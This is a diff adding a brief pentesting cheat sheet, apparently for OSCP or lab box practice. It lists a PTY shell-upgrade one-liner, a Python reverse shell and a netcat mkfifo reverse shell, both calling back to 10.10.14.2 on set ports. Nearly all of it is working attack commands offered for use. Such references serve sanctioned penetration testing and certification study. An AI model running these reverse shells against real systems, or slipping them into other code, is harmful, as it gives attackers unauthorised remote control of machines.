@@ -1,0 +1,16 @@
+Shells!!!
+by: Xyconix
+Usage: Pentesting or for your OSCP/Box needs!
+
+
+PTY Upgrade Shell for fixing dummy shell for additional flexibility:  
+	python -c 'import pty;pty.spawn("/bin/bash")'
+
+Note: Sometimes you need to specify the terminal variable for proper usage:
+	export TERM=xterm-256color
+
+Python Reverse Shell (Pentest Monkey)
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+Wrong version of netcat:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 3535 >/tmp/f
